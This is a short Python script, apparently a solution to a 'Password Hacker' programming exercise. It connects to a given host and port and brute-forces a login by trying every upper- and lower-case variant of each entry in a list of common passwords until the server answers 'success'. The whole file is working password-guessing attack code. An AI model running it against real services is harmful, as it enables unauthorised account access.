import sys
import socket
import itertools

args = sys.argv
hostname = args[1]
port = int(args[2])
address = (hostname, port)

client_socket = socket.socket()
client_socket.connect(address)

file = open("C:\\Users\\longr\\OneDrive\\Документы\\Python\\Password Hacker\\Password Hacker\\task\\hacking\\passwords.txt", "r", encoding="utf-8")
for line in file:
    iterator = itertools.product(*([x.lower(), x.upper()] for x in line.strip("\n")))
    for iter in iterator:
        password = "".join(iter)
        client_socket.send(password.encode())
        response = client_socket.recv(1024).decode()
        if "success" in response:
            print(password)
            client_socket.close()
            exit(0)











